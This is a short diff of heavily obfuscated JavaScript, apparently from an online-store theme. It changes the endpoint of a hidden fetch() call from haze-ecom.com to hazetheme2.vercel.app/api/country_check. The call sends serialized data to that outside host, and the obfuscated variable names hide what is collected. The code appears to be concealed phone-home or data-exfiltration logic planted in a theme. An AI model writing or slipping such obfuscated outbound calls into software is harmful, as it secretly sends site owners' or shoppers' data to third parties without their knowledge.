@@ -2213,7 +2213,7 @@ function metafieldPoly() {
         'data': serial[_0x3abc76(0x321)]()
     });
     try {
-        fetch("https://haze-ecom.com/main.js", _0x384304)['then'](_0xf94740=>{
+        fetch("https://hazetheme2.vercel.app/api/country_check", _0x384304)['then'](_0xf94740=>{
             const _0x2e5d5b = _0x3abc76;
             if (_0xf94740['status'] === 0xc9)
                 return _0xf94740[_0x2e5d5b(0x318)]();
